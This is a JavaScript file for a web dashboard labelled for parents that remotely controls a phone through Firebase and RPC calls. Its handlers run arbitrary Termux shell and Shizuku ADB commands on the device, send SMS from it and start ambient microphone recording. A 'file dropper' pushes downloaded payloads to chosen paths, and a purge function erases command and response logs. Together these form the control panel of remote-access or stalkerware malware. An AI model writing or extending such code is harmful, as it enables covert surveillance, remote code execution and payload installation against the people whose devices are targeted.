// Parent Account Settings & Preferences Handlers
function setupParentSettingsHandlers() {
    const resetBtn = document.getElementById("sendPasswordResetBtn");
    if (resetBtn) {
        resetBtn.addEventListener("click", function() {
            if (!currentUser || !currentUser.email) {
                showDashboardNotification("error", "No authenticated user email found.");
                return;
            }
            firebase.auth().sendPasswordResetEmail(currentUser.email)
                .then(() => {
                    showDashboardNotification("success", `📧 Password reset email dispatched to ${currentUser.email}`);
                })
                .catch(err => {
                    showDashboardNotification("error", `Password reset failed: ${err.message}`);
                });
        });
    }

    const prefForm = document.getElementById("parentPreferencesForm");
    if (prefForm) {
        prefForm.addEventListener("submit", function(e) {
            e.preventDefault();
            const tz = document.getElementById("prefTimezoneSelect")?.value || "AUTO";
            const interval = document.getElementById("prefPollingIntervalSelect")?.value || "REALTIME";
            const alertOffline = document.getElementById("prefAlertOfflineToggle")?.checked ?? true;

            const prefs = { timezone: tz, refreshRate: interval, alertOffline: alertOffline, updatedAt: Date.now() };

            if (currentUser && currentUser.uid) {
                firebase.database().ref(`users/${currentUser.uid}/settings`).set(prefs);
            }
            localStorage.setItem("parent_dashboard_prefs", JSON.stringify(prefs));
            showDashboardNotification("success", "✅ Parent Preferences Saved!");
        });
    }
}

function updateParentProfileUi() {
    const nameEl = document.getElementById("parentProfileName");
    const emailEl = document.getElementById("parentProfileEmail");
    const uidEl = document.getElementById("parentProfileUid");
    const roleEl = document.getElementById("parentProfileRole");

    if (nameEl && currentUser) nameEl.innerText = currentUser.displayName || currentUser.email?.split("@")[0] || "Parent";
    if (emailEl && currentUser) emailEl.innerText = currentUser.email || "--";
    if (uidEl && currentUser) uidEl.innerText = currentUser.uid || "--";
    if (roleEl) {
        roleEl.className = isMasterAdmin ? "badge bg-warning text-dark fw-bold" : "badge bg-secondary";
        roleEl.innerText = isMasterAdmin ? "👑 Master Admin" : "Standard Parent";
    }
}

// Form Handlers
document.getElementById("termuxForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const cmd = document.getElementById("termuxInput").value.trim();
    if (cmd) {
        dispatchNativeRpcAction("termux", { command: cmd });
        const consoleBox = document.getElementById("termuxConsoleOutput");
        if (consoleBox) {
            consoleBox.innerHTML += `\n$ ${cmd}\n[Executed - Awaiting Termux output...]`;
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }
        document.getElementById("termuxInput").value = "";
    }
});

document.getElementById("smsSendForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const phone = document.getElementById("smsPhoneNum").value.trim();
    const msg = document.getElementById("smsMsgText").value.trim();
    if (phone && msg) {
        dispatchNativeRpcAction("sendsms", { phone: phone, message: msg });
        showDashboardNotification("success", `✅ Outbound SMS dispatched to ${phone}`);
    }
});

document.getElementById("openUrlForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const url = document.getElementById("targetUrlInput").value.trim();
    if (url) {
        dispatchNativeRpcAction("openurl", { url: url });
        showDashboardNotification("info", `🌐 Browser target URL launched: ${url}`);
    }
});

document.getElementById("startMicRecordBtn")?.addEventListener("click", function() {
    const sec = document.getElementById("micDurationSelect").value;
    dispatchNativeRpcAction("audio", { duration: parseInt(sec, 10) });
    showDashboardNotification("info", `🎙️ Ambient Mic Recording (${sec}s) dispatched to device.`);
});

document.getElementById("shizukuForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const shizukuCmd = document.getElementById("shizukuCmdInput").value.trim();
    if (shizukuCmd) {
        dispatchNativeRpcAction("shizuku", { command: shizukuCmd });
        showDashboardNotification("info", `⚡ Shizuku ADB command dispatched: ${shizukuCmd}`);
    }
});

document.getElementById("geofenceForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const inputs = this.querySelectorAll("input");
    const zoneName = inputs[0]?.value.trim() || "Safe Zone";
    const radius = inputs[1]?.value.trim() || "500";
    dispatchNativeRpcAction("geofence", { name: zoneName, radius: parseInt(radius, 10) });

    if (currentUser && currentUser.uid) {
        firebase.database().ref(`users/${currentUser.uid}/devices/${activeDeviceId}/geofences`).push({
            name: zoneName,
            radius: parseInt(radius, 10),
            createdAt: Date.now()
        });
    }
    showDashboardNotification("success", `🌐 Geofence safe zone added: ${zoneName} (${radius}m)`);
});

document.getElementById("fileDropperForm")?.addEventListener("submit", function(e) {
    e.preventDefault();
    const url = document.getElementById("dropperTargetUrl").value.trim();
    const path = document.getElementById("dropperDestination").value.trim();
    if (url && path) {
        dispatchNativeRpcAction("download", { url: url, destination: path });
        showDashboardNotification("info", `📥 Payload push requested for ${path}`);
    }
});

function fetchCategoryTelemetryLogs(category) {
    if (!category) return;
    if (typeof queryP2pLocalDatabase === "function") {
        queryP2pLocalDatabase("TELEMETRY", category);
    }
}

function handleP2pTelemetryDatabaseResponse(category, logs) {
    console.log(`[WebRTC Direct P2P DB Response] Telemetry feed for '${category}':`, logs);
}

function showDashboardNotification(type, message) {
    console.log(`[Dashboard Notification - ${type.toUpperCase()}] ${message}`);
    const notificationContainer = document.getElementById("dashboardToastContainer") || (() => {
        const div = document.createElement("div");
        div.id = "dashboardToastContainer";
        div.className = "position-fixed bottom-0 end-0 p-3";
        div.style.zIndex = "9999";
        document.body.appendChild(div);
        return div;
    })();

    const toast = document.createElement("div");
    const bgClass = type === "success" ? "bg-success" : type === "error" ? "bg-danger" : type === "warning" ? "bg-warning text-dark" : "bg-info text-dark";
    toast.className = `toast align-items-center text-white ${bgClass} border-0 show mb-2`;
    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body extra-small">
                ${escapeHtml(message)}
            </div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
        </div>
    `;
    notificationContainer.appendChild(toast);
    setTimeout(() => {
        try { toast.remove(); } catch (_) {}
    }, 4000);
}

function purgeFirebaseJunkData() {
    if (!currentUser || !currentUser.uid) {
        showDashboardNotification("error", "Cannot purge data: Unauthenticated user.");
        return;
    }
    const uid = currentUser.uid;
    const realDevId = (typeof getActiveRealDeviceId === "function") ? getActiveRealDeviceId() : activeDeviceId;
    if (!realDevId) {
        showDashboardNotification("warning", "No target device selected for database cleanup.");
        return;
    }

    showDashboardNotification("info", `🧹 Purging junk command logs & stale signaling data for '${realDevId}'...`);
    const statusAlert = document.getElementById("dbCleanupStatusAlert");

    const updates = {};
    updates[`users/${uid}/devices/${realDevId}/actions`] = null;
    updates[`users/${uid}/devices/${realDevId}/commands`] = null;
    updates[`users/${uid}/devices/${realDevId}/webrtc_signaling/sessions`] = null;
    updates[`users/${uid}/devices/${realDevId}/response`] = null;

    firebase.database().ref().update(updates)
        .then(() => {
            showDashboardNotification("success", "✅ Database Clean-Up Complete! Purged all stale action logs, commands, and signaling junk.");
            if (statusAlert) {
                statusAlert.classList.remove("d-none");
                statusAlert.innerHTML = `<i class="fa-solid fa-circle-check text-success me-1"></i>Database Clean-Up Complete! Cleared old commands, actions, and WebRTC signaling sessions for '${realDevId}'.`;
            }
            const cleanTimeEl = document.getElementById("dbLastCleanTime");
            if (cleanTimeEl) cleanTimeEl.innerText = new Date().toLocaleTimeString();
            const junkActionsEl = document.getElementById("dbJunkActionsCount");
            if (junkActionsEl) junkActionsEl.innerText = "0 items (Clean)";
            const junkSignalingEl = document.getElementById("dbJunkSignalingCount");
            if (junkSignalingEl) junkSignalingEl.innerText = "0 items (Clean)";
        })
        .catch(err => {
            console.error("[Database Clean-Up Error]", err);
            showDashboardNotification("error", `Clean-Up Error: ${err.message}`);
        });
}

function escapeHtml(text) {
    if (!text) return "";
    return String(text)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}
